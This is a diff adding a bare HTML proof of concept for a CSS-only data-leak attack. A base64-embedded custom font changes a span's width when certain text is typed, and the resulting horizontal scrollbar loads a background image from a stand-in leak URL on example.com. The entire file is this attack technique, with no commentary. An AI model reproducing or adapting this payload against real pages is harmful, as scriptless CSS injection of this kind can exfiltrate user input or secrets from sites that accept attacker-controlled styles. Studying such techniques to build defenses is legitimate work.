@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <style>
+        @font-face {
+            font-family: "hack";
+            src: url(data:application/x-font-woff;base64,d09GRk9UVE8AAAR4AA0AAAAABqAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAABDRkYgAAADAAAAAL8AAAENuE9VxkZGVE0AAARcAAAAGQAAAByV6LvzR0RFRgAAA8AAAAAhAAAAJABOADlHUE9TAAAEKAAAACAAAAAgbJF0j0dTVUIAAAPkAAAARAAAAFTZStw2T1MvMgAAAYAAAABEAAAAYFXjXL1jbWFwAAACnAAAAFgAAAFKYztWsWhlYWQAAAEwAAAAKgAAADYYk8hfaGhlYQAAAVwAAAAbAAAAJAN8In1obXR4AAAESAAAABEAAABwJxAAAG1heHAAAAF4AAAABgAAAAYAHFAAbmFtZQAAAcQAAADWAAABX7/94gpwb3N0AAAC9AAAAAwAAAAgAAMAAHicY2BkYGAAYk1d0c/x/DZfGbiZXwBFGO7sOrwXmYYCDgYmEAUANpYKLAAAeJxjYGRgYFb4b8EQpazBAAGMDKhABgA54gIeAAAAUAAAHAAAeJxjYGb8wjiBgZWBg6mLaQ8DA0MPhGZ8wGDIyMTAwMTAyswAA4wMSCAgzTWFwYEhkaGKWeG/BUMUhhoFIGQBAFrHCkp4nF2OPY7CMBBGXyDALqDdjhZ3WyUKlhASBSUH2II+iqyAQIlk4Axb03AMDkDNwfgSvA22xvPm8/wBY65ENCciZhi4w4Bp4K6oDBzrXgL3GHEL3Jf+UGYUf0r5aKsa7vDFd+AuK34Cx8r5C9xjoh1e3Jd+Z0tOwR62eaH3F6cFzhwke4WuPB9ywZqailPrvTIcBktKJr+U/bd5RQsS5jKrf8tM5XV1Wte+dMammVmaZpjcIpknNrNKeFtjowGeI7t2rFGLZhQb54+7ujKzNHsveQLkUS2IAAB4nGNgYGBmgGAZBkYGEHAB8hjBfBYGDSDNBqQZGZiArKr//8EqEkH0/wVQ9UDAyMaA4NAKMDIxs7CysXNwcnHz8PLxCwgKCYuIiolLSErR2maiAAC3ZQifeJxjYGbACwAAfQAEeJxjZGBhYWBkZGTNSEzOZmBkYmBk0Pghw/RDlvmHBEs3D3M3D0s3ELDKMITzyzAwCMgw9AnKMHDKMLIIMTCDVHMw8DAIZMTnx6fHp4LMAJsDBE4MzgwuDK4MbgzuDB4MngxeDN4MPgy+DH4M/gwBDIEMQQzBDCEMoQxhDOEMEQyRDFEM0YztDDJAl3Bw8wmKiEvJKiiraeroG5laWNs5urh7+QYEh8s81ObrEaMm+gbE3SIySntFu3m4AKDrNPwAeJxjYGRgYOABYhkgZgJCRgYpIJYGQiYGFrAYAwAJnwCIAAAAeJxjYGRgYOBikGPQYWDMSSzJY+BgYAGKMPz/zwCSYczJTE8EijFAeEA5FjDNAcRiUJqFQRqI+RnYGViBPKAYAGZpBjMAAQAAAAoAHAAeAAFsYXRuAAgABAAAAAD//wAAAAAAAHicY37BQDegrMHAAABnXAE3AAAAeJxjYGBgZACCO8UmFWB61+G9MBoATgAIKQAAAA==)
+        }
+
+        span {
+            background: lightblue;
+            font-family: "hack";
+        }
+
+        body {
+            white-space: nowrap;
+        }
+        body::-webkit-scrollbar {
+            background: blue;
+        }
+        body::-webkit-scrollbar:horizontal {
+            background: url(http://example.com/leak);
+        }
+    </style>
+
+    <input name="i" oninput="span.textContent=this.value" /><br>
+    <span id="span">a</span>
+</body>
+</html>
